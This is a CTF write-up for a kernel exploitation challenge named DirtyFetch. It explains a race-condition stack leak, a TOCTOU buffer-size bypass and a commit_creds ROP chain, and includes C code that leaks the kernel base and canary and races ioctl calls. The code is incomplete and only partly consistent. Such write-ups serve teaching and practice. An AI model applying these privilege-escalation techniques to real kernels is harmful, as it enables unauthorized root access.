# 🏴‍☠️ PatriotCTF 2024 - DirtyFetch: A Kernel Exploitation Challenge

## 🔍 Step-by-Step Walkthrough

The DirtyFetch challenge was a kernel exploitation problem where we leveraged a race condition in a kernel module to leak sensitive information and escalate privileges. Here's a breakdown of the steps involved:

1. **Identify the Vulnerability**: The module had a race condition in the ioctl handling, allowing access to uninitialized stack memory. This let us leak the kernel base and stack canary values.

2. **Leaking Kernel and Canary Information**: By exploiting the race condition, we were able to leak key information from the stack, which we needed for further exploitation.

3. **Exploit TOCTOU**: The `validate_buf` function checked the buffer size twice (once for validation and once for allocation), which created a Time of Check to Time of Use (TOCTOU) vulnerability. We switched buffer lengths between these checks to bypass validation and exploit the overflow.

4. **Setting Up Threads**: Two threads were used to alternate between valid and invalid buffer sizes to win the race condition. One thread continuously switched buffer sizes, while the other tried to allocate the buffer.

5. **ROP Chain Setup**: Once the race condition was won, a ROP (Return-Oriented Programming) chain was set up to elevate privileges using `commit_creds(prepare_kernel_cred(0))`.

6. **Privilege Escalation and Flag Retrieval**: After executing the ROP chain, we gained root access, allowing us to read the flag and complete the challenge.

## 💻 Code with Comments

```c
// Setup the main buffer and leak values
unsigned long get_value(char *buffer, unsigned long offset) {
    return *((uint64_t *)(buffer + offset));
}

// Load buffer data
int load(int fd, char *buffer, size_t length) {
    set_value(buffer, 0, length);
    return ioctl(fd, 0x40, buffer);
}

// Set the value in the buffer
void set_value(char *buffer, unsigned long offset, unsigned long value) {
    *((uint64_t *)(buffer + offset)) = value;
}

int main() {
    char buffer[0x1000];
    fd = open("/proc/vuln", O_RDWR);

    // Leak kernel and canary from uninitialized stack content
    load(fd, buffer, 239);

    // Calculating kernel base and canary from leaked values
    unsigned long kernel_leak = get_value(buffer, 0xe8) + 0xff00000000000000;
    unsigned long kernel_base = kernel_leak - 0x35691f;
    unsigned long canary = get_value(buffer, 0xb0);

    printf("kernel leak      : %p\n", kernel_leak);
    printf("kernel base      : %p\n", kernel_base);
    printf("canary           : %p\n", canary);
}

// Race condition threads to win the TOCTOU vulnerability
void *threadSwitchLength(void *arg) {
    while (init_request_running) {
        maindata.length = 100;
        usleep(100); // Switching lengths between valid and oversized
        maindata.length = 0x200;
        usleep(100);
    }
}

void *threadWriteBuffer(void *arg) {
    while (init_request_running) {
        unsigned long result = ioctl(fd, 0x20, &maindata);
        if (result == 0x200) init_request_running = 0;
    }
}

// Final buffer overwrite for ROP chain
int save(int fd) {
    return ioctl(fd, 0x30, 0);
}

void safe_exit(void) {
    char buffer[100];
    int fd = open("/flag.txt", O_RDONLY);
    read(fd, buffer, 100);
    puts(buffer);
}
